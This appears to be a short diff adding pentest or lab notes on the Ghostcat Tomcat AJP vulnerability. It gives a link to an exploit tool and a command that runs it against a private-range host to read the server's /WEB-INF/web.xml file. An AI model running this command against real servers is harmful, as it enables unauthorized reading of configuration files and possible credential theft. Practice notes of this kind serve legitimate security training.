@@ -1,0 +1,4 @@
+https://github.com/00theway/Ghostcat-CNVD-2020-10487.git   - TOMCAT AJP SHOOTER
+python ajpShooter.py http://10.10.37.89:8080 8009 /WEB-INF/web.xml read
+
+--------------------------------------------------------------------------------------------------------------
